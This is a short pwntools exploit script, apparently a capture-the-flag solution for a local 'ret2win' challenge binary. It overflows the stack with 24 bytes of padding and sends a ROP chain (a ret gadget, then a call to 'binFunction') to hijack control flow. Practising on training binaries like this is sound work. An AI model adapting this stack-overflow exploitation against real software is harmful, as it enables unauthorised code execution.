from pwn import *

elf = context.binary = ELF("./ret2win")

rop = ROP(elf)
rop.raw(rop.ret)
rop.call(elf.symbols["binFunction"])

r = process("./ret2win")

payload = flat({24: rop.chain()})
r.recvuntil(b"coffer with?")
r.sendline(payload)

r.interactive()

